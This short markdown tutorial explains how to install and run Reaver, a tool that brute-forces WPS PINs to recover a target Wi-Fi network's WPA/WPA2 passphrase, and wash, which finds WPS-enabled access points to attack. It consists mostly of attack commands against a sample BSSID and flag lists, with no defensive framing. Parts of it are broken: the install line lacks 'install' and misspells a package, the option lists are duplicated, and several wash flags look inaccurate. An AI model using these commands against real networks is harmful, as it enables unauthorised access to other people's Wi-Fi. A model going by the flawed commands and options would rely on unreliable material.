# what is Reaver

Reaver implements a brute force attack against Wifi Protected Setup (WPS) registrar PINs in order to recover WPA/WPA2 passphrases, as described in [Brute forcing Wi-Fi Protected Setup](http://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf).

Reaver has been designed to be a robust and practical attack against WPS, and has been tested against a wide variety of access points and WPS implementations.

On average Reaver will recover the target AP's plain text WPA/WPA2 passphrase in 4-10 hours, depending on the AP. In practice, it will generally take half this time to guess the correct WPS pin and recover the passphrase.

# How to use Reaver

## Install Reaver

```bash
sudo apt-get update
sudo apt-get airckrack-ng libssl-dev sqlite3 libsqlite3-dev aircrack-ng pixiewps
sudo apt-get install reaver
```

## Run Reaver

```bash
reaver -i wlan0mon -b 00:01:02:03:04:05 -vv
```
* -i: interface which is in monitor mode
* -b: BSSID of the target AP
* -vv: verbose mode
* -c: channel of the target AP
* -a: automatically detect the best advanced options for the AP
* -d: delay in seconds between pin attempts
* -e: use external registrar's PIN

## Reaver options

```bash
reaver --help
```

* -a: automatically detect the best advanced options for the AP
* -b: target AP's BSSID
* -c: target AP's wireless channel
* -d: delay in seconds between pin attempts
* -e: use external registrar's PIN

## wash - scan for WPS enabled APs

### what is wash

Wash is a utility for identifying WPS enabled access points. It can survey the current channel and neighboring channels, identifying WPS-enabled APs and the manufacturer set default SSID prefixes. Wash can be used to scan for WPS-enabled APs and to attack those WPS access points that are vulnerable to the WPS brute force attack.

```bash
wash -i wlan0mon
```

* -i: interface which is in monitor mode
* -C: colorize output
* -s: skip wash's check for a WPS locked state
* -o: output only the AP's that have WPS enabled
* -W: wait for a WPS locked state to be cleared before scanning
* -a: automatically detect the best advanced options for the AP